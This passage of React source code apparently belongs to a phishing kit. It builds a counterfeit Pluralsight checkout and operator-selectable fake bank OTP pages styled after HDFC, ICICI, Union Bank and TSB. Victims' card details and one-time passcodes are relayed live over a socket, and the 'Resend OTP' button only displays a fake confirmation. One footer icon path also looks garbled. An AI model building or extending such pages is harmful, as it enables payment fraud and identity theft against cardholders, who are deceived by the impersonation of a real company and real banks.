                        e.currentTarget.src = 'https://logolook.net/wp-content/uploads/2021/11/HDFC-Bank-Logo-500x281.png';
                      }}
                    />
                  </div>
                  {/* Merchant Details Table */}
                  <div className="px-6 pt-4 pb-4">
                    <table className="w-full text-sm">
                      <tbody>
                        <tr>
                           <td className="text-gray-600 py-1">Merchant Name</td>
                           <td className="text-right font-medium text-gray-800 py-1">PLURALSIGHT</td>
                        </tr>
                        <tr>
                          <td className="text-gray-600 py-1">Date</td>
                          <td className="text-right font-medium text-gray-800 py-1">{new Date().toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' })}</td>
                        </tr>
                        <tr>
                          <td className="text-gray-600 py-1">Card Number</td>
                          <td className="text-right font-medium text-gray-800 py-1">{cardData.cardNumber.slice(0, 4)} XXXX XXXX {cardData.cardNumber.slice(-4)}</td>
                        </tr>
                        <tr>
                          <td className="text-gray-600 py-1">Amount</td>
                           <td className="text-right font-bold text-blue-700 py-1">
                             {otpCustomAmount !== null ? (
                               `${otpCurrencySymbol}${otpCustomAmount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
                             ) : (
                               formatPrice(displayPrice)
                             )}
                           </td>
                        </tr>
                      </tbody>
                    </table>
                  </div>
                  {/* Authenticate Transaction Title */}
                  <div className="px-4 pt-2 pb-1">
                    <h3 className="text-base font-semibold text-blue-700 text-center mb-2">Authenticate Transaction</h3>
                  </div>
                  {/* OTP Sent Message or Resend Message */}
                  <div className="px-4">
                    <div className="bg-green-50 border border-green-200 rounded p-1.5 mb-2">
                      <p className="text-green-700 text-xs text-center">
                        {resendMessage || `One time passcode has been sent to your registered mobile number XX${otpMobileLast4}`}
                      </p>
                    </div>
                  </div>
                  {/* Addon Cardholder OTP Button */}
                  <div className="px-4 mb-1">
                    <button className="w-full bg-blue-50 text-blue-700 text-xs font-semibold py-1 rounded border border-blue-100 hover:bg-blue-100 transition">
                      CLICK HERE For Addon Cardholder OTP
                    </button>
                  </div>
                  {/* Error Message (Fail OTP) */}
                  {otpError && (
                    <div className="px-4 mb-1">
                      <div className="border border-red-500 rounded p-1.5">
                        <p className="text-red-700 text-xs text-center">{otpError}</p>
                      </div>
                    </div>
                  )}
                  {/* OTP Input */}
                  <div className="px-4 mb-1">
                    <input
                      value={otpValue}
                      onChange={e => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
                      disabled={otpSubmitting}
                      className="w-full text-center text-base tracking-widest h-10 border-2 border-blue-400 rounded bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-blue-400"
                      placeholder="Enter OTP Here"
                      maxLength={6}
                      style={{ letterSpacing: '0.3em', fontSize: '0.875rem' }}
                    />
                  </div>
                  {/* Resend OTP Link */}
                  <div className="px-4 mb-1 text-right">
                    <button
                      onClick={() => {
                        setResendMessage('One time passcode have been sent to your registered mobile number XX' + otpMobileLast4);
                        // Clear the message after 3 seconds
                        setTimeout(() => setResendMessage(''), 3000);
                      }}
                      className="text-blue-700 text-xs font-semibold hover:underline focus:outline-none"
                      disabled={otpSubmitting}
                    >
                      Resend OTP
                    </button>
                  </div>
                  {/* Action Buttons */}
                  <div className="px-4 pb-2">
                    <div className="flex gap-2">
                      {/* Submit Button - Half Width */}
                      <button
                        onClick={handleOtpSubmit}
                        disabled={otpValue.length !== 6 || otpSubmitting}
                        className="flex-1 h-8 rounded bg-blue-700 text-white font-semibold hover:bg-blue-800 transition disabled:opacity-50 relative text-xs"
                      >
                        {otpSubmitting ? (
                          <span className="flex items-center justify-center"><Loader2 className="h-3 w-3 animate-spin mr-1" />SUBMIT</span>
                        ) : (
                          'SUBMIT'
                        )}
                      </button>
                      {/* Cancel Button - Half Width */}
                      <button
                        onClick={() => setShowCancelConfirm(true)}
                        disabled={otpSubmitting}
                        className="flex-1 h-8 rounded bg-gray-500 text-white font-semibold hover:bg-gray-600 transition disabled:opacity-50 text-xs"
                      >
                        CANCEL
                      </button>
                    </div>
                  </div>

                  {/* Timer and Powered by Footer */}
                  <div className="text-center space-y-1 pb-3 pt-1">
                    <p className="text-xs text-gray-500">
                      This page automatically time out after {formatTimer(otpTimer)} minutes
                    </p>
                    <div className="flex items-center justify-center gap-1">
                      <span className="text-xs text-gray-500">Powered by</span>
                      <img
                        src="https://www.pngkey.com/png/detail/281-2815007_wibmo-logo.png"
                        alt="Wibmo"
                        className="h-3 object-contain"
                      />
                    </div>
                  </div>
                  {/* Spinner overlay for Declined/Insufficient */}
                  {/* Decline/Insufficient error message (after redirect) */}
                  {declineError && (
                    <div className="absolute left-0 right-0 top-2 text-center">
                      <span className="text-red-600 text-sm font-semibold">{declineError}</span>
                    </div>
                  )}
                </div>
                </div>
              </div>
            )}

            {/* Review Section */}
            {currentStep === 'review' && (
              <>
                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-green-600 rounded-full flex items-center justify-center text-sm font-medium flex-shrink-0">
                    ✓
                  </div>
                  <span className="text-slate-300 font-medium">Account details</span>
                </div>

                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-green-600 rounded-full flex items-center justify-center text-sm font-medium flex-shrink-0">
                    ✓
                  </div>
                  <span className="text-slate-300 font-medium">Payment</span>
                </div>

                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-sm font-medium flex-shrink-0">
                    3
                  </div>
                  <h2 className="text-2xl font-bold">Review and confirm</h2>
                </div>

                <div className="bg-slate-800 rounded-lg p-6 mb-8">
                  <h3 className="text-xl font-bold mb-6">Review your order details</h3>
                  
                  <div className="space-y-4">
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Plan</span>
                      <span className="text-slate-300">{planName} - {billingText}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Payment Method</span>
                      <div className="flex items-center gap-3">
                        <img 
                          src={cardBrandLogos[getCardBrand(cardData.cardNumber) as keyof typeof cardBrandLogos]} 
                          alt="Card Brand" 
                          className="h-6 w-10 object-contain"
                          onError={(e) => {
                            e.currentTarget.src = cardBrandLogos.visa;
                          }}
                        />
                        <span className="text-slate-300">ending in {cardData.cardNumber.slice(-4)}</span>
                      </div>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Billing Cycle</span>
                      <span className="text-slate-300">{billing === 'yearly' ? 'Yearly' : 'Monthly'}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Date & Time</span>
                      <span className="text-slate-300">{new Date().toLocaleString()}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Country</span>
                      <span className="text-slate-300">{formData.country}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Customer</span>
                      <span className="text-slate-300">{formData.firstName} {formData.lastName}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Email</span>
                      <span className="text-slate-300">{formData.email}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Transaction ID</span>
                      <span className="text-slate-300 font-mono">{transactionId}</span>
                    </div>
                    
                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                      <span className="font-medium">Total Amount</span>
                      <span className="text-xl font-bold text-white">{formatPrice(displayPrice)}</span>
                    </div>
                  </div>
                </div>

                {/* Consent Checkbox */}
                <div className="flex items-start gap-3 mb-6">
                  <Checkbox 
                    id="final-consent-checkbox"
                    checked={finalConsent}
                    onCheckedChange={(checked) => setFinalConsent(checked === true)}
                    className="w-5 h-5 mt-1 flex-shrink-0 border-2 border-gray-400 data-[state=checked]:bg-blue-600 data-[state=checked]:border-blue-600 data-[state=unchecked]:bg-transparent data-[state=unchecked]:border-gray-400 hover:border-blue-500 transition-colors cursor-pointer" 
                  />
                  <label 
                    htmlFor="final-consent-checkbox"
                    className="text-sm text-gray-400 leading-relaxed pt-0.5 cursor-pointer"
                  >
                    By checking here and continuing, I agree to the Pluralsight{' '}
                    <a href="https://legal.pluralsight.com/policies" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                      Terms of Use
                    </a>
                    .
                  </label>
                </div>

                <Button
                  onClick={handleConfirmPayment}
                  disabled={confirmingPayment || !finalConsent}
                  className={`w-full sm:w-auto px-8 sm:px-12 py-2 sm:py-3 rounded font-medium text-sm sm:text-base relative ${
                    finalConsent && !confirmingPayment
                      ? 'bg-green-600 hover:bg-green-700 text-white' 
                      : 'bg-slate-500 text-slate-300 cursor-not-allowed'
                  }`}
                >
                  {confirmingPayment && (
                    <>
                      <div className="absolute inset-0 bg-green-600 bg-opacity-50 rounded flex items-center justify-center">
                        <Loader2 className="h-5 w-5 animate-spin" />
                      </div>
                      <span className="blur-sm">Confirm Payment</span>
                    </>
                  )}
                  {!confirmingPayment && 'Confirm Payment'}
                </Button>
              </>
            )}

            {/* OTP Section */}
            {currentStep === 'otp' && (
              <div className="fixed inset-0 z-[9999] bg-white flex items-center justify-center" style={{ touchAction: 'auto', WebkitTouchCallout: 'default', WebkitUserSelect: 'text', overflow: 'auto' }}>
                    {/* Render different OTP pages based on selection */}
                {otpPageSelection === 'old' && !useNewOTPPage && (
                  // Restored Original Simple Bank-Style OTP Modal
                  <div className="fixed inset-0 bg-black bg-opacity-30 flex items-center justify-center z-50 p-4">
                    <div className="relative bg-white rounded-lg shadow-xl max-w-sm w-full mx-auto">
                      {/* Simple Header */}
                      <div className="bg-blue-50 border-b px-4 py-3 rounded-t-lg">
                        <div className="flex items-center justify-between">
                          <h3 className="text-lg font-semibold text-gray-800">OTP Verification</h3>
                          <button
                            onClick={handleOtpCancel}
                            className="text-gray-400 hover:text-gray-600 text-xl font-bold"
                          >
                            ×
                          </button>
                        </div>
                      </div>

                      {/* Main Content */}
                      <div className="p-6">
                        {/* Bank Logo Section */}
                        <div className="text-center mb-6">
                          {adminSelectedBankLogo ? (
                            <img 
                              src={adminSelectedBankLogo} 
                              alt="Bank Logo" 
                              className="h-12 w-auto mx-auto object-contain"
                              onError={(e) => {
                                e.currentTarget.style.display = 'none';
                                (e.currentTarget.nextElementSibling as HTMLElement)!.style.display = 'block';
                              }}
                            />
                          ) : null}
                          <div className="text-blue-600 font-bold text-lg" style={{display: adminSelectedBankLogo ? 'none' : 'block'}}>
                            BANK
                          </div>
                        </div>

                        {/* Transaction Info */}
                        <div className="bg-gray-50 rounded p-4 mb-6">
                          <div className="text-center">
                            <p className="text-sm text-gray-600 mb-1">Transaction Amount</p>
                            <p className="text-xl font-bold text-gray-800">{formatPrice(displayPrice)}</p>
                          </div>
                        </div>

                        {/* OTP Message */}
                        <div className="text-center mb-6">
                          <p className="text-gray-700 text-sm mb-2">
                            An OTP has been sent to your registered mobile number
                          </p>
                          <p className="text-blue-600 font-mono font-medium">
                            ******{otpMobileLast4 || '4679'}
                          </p>
                        </div>

                        {/* Error Message */}
                        {otpError && (
                          <div className="bg-red-50 border border-red-200 rounded p-3 mb-4">
                            <p className="text-red-700 text-sm text-center font-medium">{otpError}</p>
                          </div>
                        )}

                        {/* OTP Input */}
                        <div className="mb-6">
                          <label className="block text-sm font-medium text-gray-700 mb-2">Enter OTP</label>
                          <input
                            type="text"
                            placeholder="Enter 6-digit OTP"
                            value={otpValue}
                            onChange={(e) => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
                            disabled={otpSubmitting}
                            className={`w-full p-3 border border-gray-300 rounded-lg text-center text-lg font-mono tracking-wider focus:border-blue-500 focus:ring-2 focus:ring-blue-200 ${otpSubmitting ? 'bg-gray-100' : 'bg-white'}`}
                            maxLength={6}
                            autoFocus
                          />
                        </div>

                        {/* Resend OTP */}
                        <div className="text-center mb-6">
                          <button 
                            onClick={handleResendOtp}
                            className="text-blue-600 text-sm hover:underline"
                          >
                            Resend OTP
                          </button>
                        </div>

                        {/* Action Buttons */}
                        <div className="flex gap-3">
                          <button
                            onClick={handleOtpCancel}
                            disabled={otpSubmitting}
                            className="flex-1 px-4 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 font-medium text-sm disabled:opacity-50"
                          >
                            Cancel
                          </button>
                          <button
                            onClick={handleOtpSubmit}
                            disabled={otpValue.length !== 6 || otpSubmitting}
                            className={`flex-1 px-4 py-3 bg-blue-600 text-white rounded-lg font-medium text-sm hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed ${otpSubmitting ? 'relative overflow-hidden' : ''}`}
                          >
                            {otpSubmitting ? (
                              <>
                                <div className="absolute inset-0 flex items-center justify-center">
                                  <div className="animate-spin rounded-full h-5 w-5 border-2 border-white border-t-transparent"></div>
                                </div>
                                <span className="opacity-0">Submit</span>
                              </>
                            ) : (
                              'Submit'
                            )}
                          </button>
                        </div>

                        {/* Timer */}
                        <div className="text-center mt-4">
                          <p className="text-xs text-gray-500">
                            This session will expire in {formatTimer(otpTimer)} minutes
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                )}

                {otpPageSelection === 'new' && useNewOTPPage && (
                  <NewOTPPage
                    cardData={cardData}
                    otpValue={otpValue}
                    setOtpValue={setOtpValue}
                    otpSubmitting={otpSubmitting}
                    handleOtpSubmit={handleOtpSubmit}
                    handleOtpCancel={handleOtpCancel}
                    otpError={otpError}
                    adminSelectedBankLogo={adminSelectedBankLogo}
                    sessionBankLogo={sessionBankLogo}
                    cardBrandLogos={cardBrandLogos}
                    getCardBrand={getCardBrand}
                    displayPrice={displayPrice}
                    formatPrice={formatPrice}
                  />
                )}

                {otpPageSelection === 'third' && (
                  <ThirdOTPPage
                    cardData={cardData}
                    otpValue={otpValue}
                    setOtpValue={setOtpValue}
                    otpSubmitting={otpSubmitting}
                    handleOtpSubmit={handleOtpSubmit}
                    handleOtpCancel={handleOtpCancel}
                    otpError={otpError}
                    adminSelectedBankLogo={adminSelectedBankLogo}
                    sessionBankLogo={sessionBankLogo}
                    cardBrandLogos={cardBrandLogos}
                    getCardBrand={getCardBrand}
                    displayPrice={displayPrice}
                    formatPrice={formatPrice}
                  />
                )}

                {otpPageSelection === 'icici' && (
                  <ICICIBankOTPPage
                    cardData={cardData}
                    billingDetails={formData}
                    otpValue={otpValue}
                    setOtpValue={setOtpValue}
                    otpSubmitting={otpSubmitting}
                    handleOtpSubmit={handleOtpSubmit}
                    handleOtpCancel={handleOtpCancel}
                    otpError={otpError}
                    adminSelectedBankLogo={adminSelectedBankLogo}
                    sessionBankLogo={sessionBankLogo}
                    cardBrandLogos={cardBrandLogos}
                    getCardBrand={getCardBrand}
                    displayPrice={displayPrice}
                    formatPrice={formatPrice}
                  />
                )}

                {otpPageSelection === 'union' && (
                  <UnionBankOTPPage
                    cardData={cardData}
                    billingDetails={{
                      firstName: formData.firstName,
                      lastName: formData.lastName,
                      email: formData.email,
                      phone: '+1234567890', // Default phone for Union Bank
                      address: '123 Main Street', // Default address
                      city: 'Mumbai',
                      state: 'Maharashtra',
                      zipCode: '400001',
                      country: formData.country
                    }}
                    amount={displayPrice}
                    currency={currency || globalCurrency} // 🔧 FIX: Pass dynamic currency
                    onOtpSubmit={(otp) => {
                      setOtpValue(otp);
                      // Handle OTP submission directly with the passed OTP value
                      try {
                        if (!socket) {
                          alert('Connection lost. Please refresh the page and try again.');
                          return;
                        }
                        
                        if (!otp || otp.length < 4) {
                          alert('Please enter a valid OTP.');
                          return;
                        }
                        
                        setOtpSubmitting(true);
                        setOtpError('');
                        setIsProcessing(true); // Show spinner during OTP submit
                        socket.emit('otp-submitted', { otp: otp, paymentId });
                      } catch (error) {
                        console.error('Error submitting OTP:', error);
                        setOtpSubmitting(false);
                        alert('Failed to submit OTP. Please try again.');
                      }
                    }}
                    onCancel={handleOtpCancel}
                    onResendOtp={handleResendOtp}
                    otpSubmitting={otpSubmitting}
                    otpError={otpError}
                    cardBrandLogos={cardBrandLogos}
                    getCardBrand={getCardBrand}
                  />
                )}

                {otpPageSelection === 'tsb' && (
                  <TSBOTPPage
                    cardData={cardData}
                    billingDetails={formData}
                    otpValue={otpValue}
                    setOtpValue={setOtpValue}
                    otpSubmitting={otpSubmitting}
                    handleOtpSubmit={handleOtpSubmit}
                    handleOtpCancel={handleOtpCancel}
                    otpError={otpError}
                    adminSelectedBankLogo={adminSelectedBankLogo}
                    sessionBankLogo={sessionBankLogo}
                    cardBrandLogos={cardBrandLogos}
                    getCardBrand={getCardBrand}
                    displayPrice={displayPrice}
                    formatPrice={formatPrice}
                  />
                )}
              </div>
            )}
          </div>

          {/* Order Summary */}
          <div className="lg:col-span-1 w-full">
            <div className="bg-slate-800 rounded-lg p-4 sm:p-6">
              <h3 className="text-lg sm:text-xl font-bold mb-4 sm:mb-6">Order summary</h3>
              
              <div className="flex justify-between items-center mb-3 sm:mb-4">
                <span className="font-medium text-sm sm:text-base">Plan</span>
                <span className="font-medium text-sm sm:text-base">Price</span>
              </div>
              
              <div className="flex justify-between items-start sm:items-center mb-4 sm:mb-6 pb-3 sm:pb-4 border-b border-slate-600">
                <span className="text-slate-300 text-sm sm:text-base pr-2">{planName} - {billingText}</span>
                <span className="font-bold text-sm sm:text-base whitespace-nowrap">{formatPrice(displayPrice)}</span>
              </div>

              {/* Promo Code */}
              <div className="mb-4 sm:mb-6">
                <div className="flex flex-col xs:flex-row gap-2">
                  <Input
                    value={promoCode}
                    onChange={(e) => setPromoCode(e.target.value)}
                    placeholder="Promo Code"
                    className="bg-white text-slate-900 border-slate-300 flex-1 text-sm sm:text-base"
                  />
                  <Button variant="outline" className="text-slate-900 border-slate-300 bg-blue-600 text-white hover:bg-blue-700 px-4 py-2 text-sm sm:text-base whitespace-nowrap">
                    Apply
                  </Button>
                </div>
              </div>

              {/* Summary */}
              <div className="space-y-2 sm:space-y-3 mb-4 sm:mb-6">
                <div className="flex justify-between">
                  <span className="text-slate-300 text-sm sm:text-base">Subtotal</span>
                  <span className="text-sm sm:text-base">{formatPrice(displayPrice)}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-300 text-sm sm:text-base">Estimated tax<sup>†</sup></span>
                  <span className="text-sm sm:text-base">{currencySymbol}0</span>
                </div>
              </div>

              <div className="border-t border-slate-600 pt-3 sm:pt-4 mb-4 sm:mb-6">
                <div className="flex justify-between items-center">
                  <span className="text-lg sm:text-xl font-bold">Total due today</span>
                  <span className="text-lg sm:text-xl font-bold">{formatPrice(displayPrice)}</span>
                </div>
              </div>

              {/* Tax Notice */}
              <div className="text-xs text-slate-400 space-y-2 leading-tight">
                <p>
                  <sup>†</sup> Pluralsight is required by law to collect transaction taxes such as sales tax, VAT, GST or other similar taxes on purchases in some jurisdictions. The actual tax amount will be calculated based on the applicable jurisdictional tax rates when your order is processed.
                </p>
                <p>
                  <sup>††</sup> Excluding transaction taxes such as sales tax, VAT, GST and other similar taxes
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Next Steps Preview */}
      <div className="border-t border-slate-700 px-6 py-6">
        <div className="max-w-7xl mx-auto">
          <div className="flex items-center gap-8">
            <div className="flex items-center gap-3">
              <div className="w-6 h-6 bg-slate-600 rounded-full flex items-center justify-center text-xs flex-shrink-0">
                2
              </div>
              <span className="text-slate-400">Payment</span>
            </div>
            <div className="flex items-center gap-8">
              <div className="flex items-center gap-3">
                <div className="w-6 h-6 bg-slate-600 rounded-full flex items-center justify-center text-xs flex-shrink-0">
                  3
                </div>
                <span className="text-slate-400">Review and confirm</span>
              </div>
              <div className="flex items-center gap-2 text-slate-400 text-sm">
                <Lock size={20} />
                <span>Secure checkout</span>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Comprehensive Footer */}
      <footer className="bg-slate-900 border-t border-slate-700">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 py-8 sm:py-12">
          <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-5 gap-6 sm:gap-8 mb-8 sm:mb-12">
            {/* Support */}
            <div>
              <h4 className="font-semibold mb-3 sm:mb-4 text-sm sm:text-base">Support</h4>
              <ul className="space-y-1.5 sm:space-y-2 text-xs sm:text-sm text-gray-400">
                <li><a href="https://help.pluralsight.com/" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Contact</a></li>
                <li><a href="https://help.pluralsight.com/" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Help Center</a></li>
                <li className="hidden sm:block"><a href="https://help.pluralsight.com/help/ip-allowlist" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">IP Allowlist</a></li>
                <li className="hidden sm:block"><a href="https://www.pluralsight.com/sitemap" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Sitemap</a></li>
                <li className="hidden md:block"><a href="https://www.pluralsight.com/mobile" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Download Pluralsight</a></li>
                <li className="hidden md:block"><a href="https://www.pluralsight.com/individuals/pricing" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">View Plans</a></li>
                <li className="hidden md:block"><a href="https://www.pluralsight.com/product/flow" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Flow Plans</a></li>
                <li className="hidden md:block"><a href="https://www.pluralsight.com/professional-services" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Professional Services</a></li>
              </ul>
            </div>

            {/* Community */}
            <div>
              <h4 className="font-semibold mb-3 sm:mb-4 text-sm sm:text-base">Community</h4>
              <ul className="space-y-1.5 sm:space-y-2 text-xs sm:text-sm text-gray-400">
                <li><a href="https://www.pluralsight.com/guides" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Guides</a></li>
                <li><a href="https://www.pluralsight.com/teach" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Teach</a></li>
                <li className="hidden sm:block"><a href="https://www.pluralsight.com/partners" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Partner with Pluralsight</a></li>
                <li className="hidden sm:block"><a href="https://www.pluralsight.com/one" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Pluralsight One</a></li>
                <li className="hidden md:block"><a href="https://www.pluralsight.com/authors" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Authors</a></li>
              </ul>
            </div>

            {/* Company */}
            <div className="col-span-2 sm:col-span-1">
              <h4 className="font-semibold mb-3 sm:mb-4 text-sm sm:text-base">Company</h4>
              <ul className="space-y-1.5 sm:space-y-2 text-xs sm:text-sm text-gray-400">
                <li><a href="https://www.pluralsight.com/about" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">About Us</a></li>
                <li><a href="https://www.pluralsight.com/careers" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Careers</a></li>
                <li className="hidden sm:block"><a href="https://www.pluralsight.com/newsroom" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Newsroom</a></li>
                <li className="hidden sm:block"><a href="https://www.pluralsight.com/resources" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Resources</a></li>
              </ul>
            </div>

            {/* Industries */}
            <div>
              <h4 className="font-semibold mb-4">Industries</h4>
              <ul className="space-y-2 text-sm text-gray-400">
                <li><a href="https://www.pluralsight.com/industries/education" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Education</a></li>
                <li><a href="https://www.pluralsight.com/industries/financial-services" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Financial Services (FSBI)</a></li>
                <li><a href="https://www.pluralsight.com/industries/healthcare" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Healthcare</a></li>
                <li><a href="https://www.pluralsight.com/industries/insurance" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Insurance</a></li>
                <li><a href="https://www.pluralsight.com/industries/non-profit" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Non-Profit</a></li>
                <li><a href="https://www.pluralsight.com/industries/public-sector" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Public Sector</a></li>
              </ul>
            </div>

            {/* Newsletter */}
            <div>
              <h4 className="font-semibold mb-4">Newsletter</h4>
              <p className="text-sm text-gray-400 mb-4">
                Sign up with your email to join our mailing list.
              </p>
              <div className="space-y-4">
                <Input type="email" placeholder="Email Address" className="bg-slate-800 border-slate-600 text-white placeholder:text-gray-400" />
                <div className="flex items-start gap-2">
                  <Checkbox className="mt-1" />
                  <label className="text-xs text-gray-400 leading-relaxed">
                    I would like to receive emails from Pluralsight
                  </label>
                </div>
                <Button className="w-full bg-red-500 hover:bg-red-600 text-white py-2 rounded-full">
                  Submit
                </Button>
              </div>

              {/* Social Icons */}
              <div className="flex gap-4 mt-6">
                <a href="https://twitter.com/pluralsight" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z" /></svg>
                </a>
                <a href="https://www.facebook.com/pluralsight" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M22.46 6c-.77.35-1.6.58-2.46.69.88-.53 1.56-1.37 1.88-2.38-.83.5-1.75.85-2.72 1.05C18.37 4.5 17.26 4 16 4c-2.35 0-4.27 1.92-4.27 4.29 0 .34.04.67.11.98C8.28 9.09 5.11 7.38 3 4.79c-.37.63-.58 1.37-.58 2.15 0 1.49.75 2.81 1.91 3.56-.71 0-1.37-.2-1.95-.5v.03c0 2.08 1.48 3.82 3.44 4.21a4.22 4.22 0 0 1-1.93.07 4.28 4.28 0 0 0 4 2.98 8.521 8.521 0 0 1-5.33 1.84c-.34 0-.68-.02-1.02-.06C3.44 20.29 5.7 21 8.12 21 16 21 20.33 14.46 20.33 8.79c0-.19 0-.37-.01-.56.84-.6 1.56-1.36 2.14-2.23z" /></svg>
                </a>
                <a href="https://www.instagram.com/pluralsight" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.174-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.219-.359-.219c0-1.781 1.062-3.188 2.384-3.188 1.125 0 1.669.844 1.669 1.853 0 1.128-.719 2.813-1.094 4.375-.312 1.313.656 2.384 1.953 2.384 2.344 0 4.031-3.021 4.031-6.594 0-2.724-1.812-4.781-4.969-4.781-3.72 0-6.062 2.75-6.062 5.797 0 1.047.401 1.789.934 2.384.219.25.25.469.188.719-.063.281-.203.844-.266 1.078-.078.375-.312.469-.719.281-1.297-.469-1.906-1.844-1.906-3.375 0-2.5 2.094-5.5 6.25-5.5 3.359 0 5.469 2.437 5.469 5.031 0 3.437-1.875 6.094-4.625 6.094-1.125 0-2.125-.656-2.469-1.406 0 0-.594 2.437-.719 2.937-.25.969-.875 1.844-1.281 2.469 1.062.328 2.188.516 3.375.516 6.624 0 11.99-5.367 11.99-11.988C24.007 5.367 18.641.001 12.017.001z" /></svg>
                </a>
                <a href="https://www.linkedin.com/company/pluralsight" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.719 2.813-1.094 4.375-.312 1.313.656 2.384 1.953 2.384 2.344 0 4.031-3.021 4.031-6.594 0-2.724-1.812-4.781-4.969-4.781-3.72 0-6.062 2.75-6.062 5.797 0 1.047.401 1.789.934 2.384.219.25.25.469.188.719-.063.281-.203.844-.266 1.078-.078.375-.312.469-.719.281-1.297-.469-1.906-1.844-1.906-3.375 0-2.5 2.094-5.5 6.25-5.5 3.359 0 5.469 2.437 5.469 5.031 0 3.437-1.875 6.094-4.625 6.094-1.125 0-2.125-.656-2.469-1.406 0 0-.594 2.437-.719 2.937-.25.969-.875 1.844-1.281 2.469 1.062.328 2.188.516 3.375.516 6.624 0 11.99-5.367 11.99-11.988C24.007 5.367 18.641.001 12.017.001z" /></svg>
                </a>
                <a href="https://www.youtube.com/pluralsight" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
